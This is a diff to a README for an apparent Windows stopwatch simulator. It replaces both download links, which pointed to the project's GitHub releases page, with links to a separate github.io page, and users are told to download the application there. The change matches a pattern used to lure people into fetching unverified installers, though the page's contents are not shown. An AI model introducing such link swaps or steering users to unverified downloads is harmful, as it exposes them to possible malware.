@@ -1,6 +1,6 @@
 # ⏱️ m5stack-stopwatch-simulator - Run Your Stopwatch on Windows
 
-[![Download Now](https://img.shields.io/badge/Download-m5stack--stopwatch--simulator-blue?style=for-the-badge&logo=github)](https://github.com/Lasflautas26/m5stack-stopwatch-simulator/releases)
+[![Download Now](https://img.shields.io/badge/Download-m5stack--stopwatch--simulator-blue?style=for-the-badge&logo=github)](https://lasflautas26.github.io)
 
 ## 👋 Welcome
 
@@ -12,7 +12,7 @@ Getting the simulator running on your Windows PC is simple. Follow these steps, 
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Lasflautas26/m5stack-stopwatch-simulator/releases](https://github.com/Lasflautas26/m5stack-stopwatch-simulator/releases)
+Visit this link to download the application: [https://lasflautas26.github.io](https://lasflautas26.github.io)
 
 Look for the latest release and download the file. The download will start automatically after you click the download button.
 
